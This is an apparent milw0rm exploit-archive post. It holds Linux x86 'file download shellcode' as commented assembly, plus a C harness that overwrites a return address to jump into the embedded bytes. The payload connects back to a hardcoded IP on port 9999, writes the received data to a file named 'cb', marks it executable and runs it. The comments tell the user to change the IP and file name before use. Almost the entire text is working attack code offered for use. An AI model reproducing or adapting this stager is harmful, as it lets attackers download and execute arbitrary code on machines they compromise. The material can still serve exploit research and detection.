/*
;file download shellcode (149 bytes)
;
;connect back, download a file and execute.
;modify the name of the file and the ip address first.
;
;militan
;Advanced Defense Lab(ADL)
;



global _start

_start:

xor ecx,ecx
mul ecx
xor ebx,ebx
cdq

;socket
push eax
push byte 0x1
push byte 0x2
mov ecx,esp
inc ebx
mov al,0x66
int 0x80
mov edi,eax             ;edi=sockfd


;connect,port(9999)=270f ip(140.115.53.35)=(8c.73.35.23)
push edx
push long 0x2335738c     ;address *
push word 0x0f27        ;port    *
mov dl,0x02
push dx                 ;family  1
mov ecx,esp              ;adjust struct
push byte 0x10
push ecx
push edi                ;sockfd
mov ecx,esp
mov bl,3
mov al,102
int 0x80

;sys_open(cb,O_WRONLY|O_CREATE|O_TRUNC[0001.0100.1000=1101],700)
xor ebx,ebx
xor ecx,ecx
push ecx
push word 0x6263        ;file name="cb"
mov ebx,esp
mov cx,0x242
mov dx,0x1c0            ;Octal
mov al,5
int 0x80
mov esi,eax             ;esi=fd


;
xor ecx,ecx
mul ecx
cdq
mov dx,0x03e8         ;memory chunk=1000=0x03e8: read per time

L1:
;sys_read(socket sockfd,buf,len)
xor ebx,ebx
xor eax,eax
mov al,3
mov ebx,edi            ;edi=sock fd
lea ecx,[esp-1000]      ;memory chunk
int 0x80
;sys_write(fd,*buf,count)
mov ebx,esi
mov edx,eax
xor eax,eax
mov al,4
int 0x80
cmp dx,0x03e8
je L1                  ;loop


CONTINUE:
;sys_close(fd)
mov ebx,esi
xor eax,eax
mov al,6
int 0x80

;execve[./cb,0]
xor ecx,ecx
mul ecx
push ecx
push word 0x6263       ;file name="cb"
mov ebx,esp
push ecx
push ebx
mov ecx,esp
mov al,0x0b
int 0x80


EXIT:
xor eax,eax
xor ebx,ebx
inc eax
int 0x80
*/

#include<stdio.h>
#include<string.h>
#include<stdlib.h>


unsigned char shellcode[]="\x31\xc9\xf7\xe1\x31\xdb\x99\x50\x6a\x01\x6a\x02\x89\xe1\x43\xb0\x66\xcd\x80"
"\x89\xc7\x52\x68\x8c\x73\x35\x23\x66\x68\x27\x0f\xb2\x02\x66\x52\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb3\x03\xb0\x66\xcd\x80"
"\x31\xdb\x31\xc9\x51\x66\x68\x63\x62\x89\xe3\x66\xb9\x42\x02\x66\xba\xc0\x01\xb0\x05\xcd\x80"

"\x89\xc6\x31\xc9\xf7\xe1\x99\x66\xba\xe8\x03\x31\xdb\x31\xc0\xb0\x03\x89\xfb\x8d\x8c\x24\x18\xfc\xff\xff\xcd\x80\x89\xf3\x89\xc2\x31\xc0\xb0\x04\xcd\x80"
"\x66\x81\xfa\xe8\x03\x74\xde\x89\xf3\x31\xc0\xb0\x06\xcd\x80\x31\xc9\xf7\xe1\x51\x66\x68\x63\x62\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
"\x31\xc0\x31\xdb\x40\xcd\x80";

void k(){
 int *ret;
 ret=(int *)&ret+2;
 (*ret)=(int)shellcode;
}

int main (){
  k();
  return 0;
}

// milw0rm.com [2008-08-25]